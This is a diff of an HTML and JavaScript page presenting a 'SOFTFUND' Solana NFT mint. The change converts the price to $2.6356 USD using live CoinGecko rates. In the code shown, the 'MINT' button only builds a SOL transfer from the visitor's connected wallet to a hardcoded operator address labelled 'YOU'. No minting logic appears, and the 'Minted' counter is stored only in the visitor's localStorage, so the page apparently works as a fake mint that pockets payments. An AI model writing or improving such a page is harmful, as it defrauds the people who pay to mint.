@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>SOFTFUND – Mint Live</title>
+  <title>SOFTFUND – $2.6356 Mint</title>
   <style>
     body{margin:0;background:#0c0b1a;font-family:system-ui;color:#fff;display:grid;place-items:center;min-height:100vh;padding:15px}
     .c{max-width:380px;width:100%;background:#141222;padding:32px;border-radius:20px;text-align:center;border:1px solid #333}
@@ -21,9 +21,10 @@
   <div class="c">
     <div class="t">SOFTFUND</div>
     <div style="color:#aaa;font-size:0.95rem">10,000 Supply • Solana</div>
-    <div class="p">2.5730 SOL</div>
+    <div class="p">$2.6356</div>
     <div>Minted: <span id="m">0</span>/10,000</div>
-    <button class="b" onclick="show()">MINT NOW</button>
+    <div style="color:#666;font-size:0.8rem" id="sol">~0 SOL</div>
+    <button class="b" onclick="show()">MINT $2.6356</button>
 
     <div id="w" class="w">
       <div class="wb" onclick="go('phantom')">Phantom</div>
@@ -42,12 +43,28 @@
 
   <script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
   <script>
-    const PRICE = 2.5730 * 1e9;
+    const USD_PRICE = 2.6356;
     const YOU = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
     const s = document.getElementById("s");
     const m = document.getElementById("m");
+    const solLabel = document.getElementById("sol");
     let c = parseInt(localStorage.getItem("sf") || "0");
     m.innerText = c;
+    let currentLamports = 0;
+
+    // Live SOL/USD price
+    async function updatePrice() {
+      try {
+        const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
+        const j = await r.json();
+        const solPrice = j.solana.usd;
+        const solAmount = USD_PRICE / solPrice;
+        currentLamports = Math.ceil(solAmount * 1e9);
+        solLabel.textContent = `~${solAmount.toFixed(5)} SOL`;
+      } catch(e) { solLabel.textContent = "price error"; }
+    }
+    updatePrice();
+    setInterval(updatePrice, 10000);
 
     function t(x, col="#0f9") { s.innerHTML = x; s.style.color = col; }
     function show() { document.querySelector(".b").style.display="none"; document.getElementById("w").style.display="grid"; }
@@ -72,16 +89,16 @@
 
     async function tryMint() {
       const p = window.solana || window.ethereum || window.okxwallet || window.rainbow;
-      if (!p) return;
+      if (!p || currentLamports === 0) return;
       try {
         if (!p.isConnected) await p.connect();
-        t("Sending 2.5730 SOL… <span class='l'></span>");
+        t("Sending $2.6356… <span class='l'></span>");
         const C = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
         const tx = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: p.publicKey,
             toPubkey: new solanaWeb3.PublicKey(YOU),
-            lamports: PRICE
+            lamports: currentLamports
           })
         );
         tx.recentBlockhash = (await C.getLatestBlockhash()).blockhash;
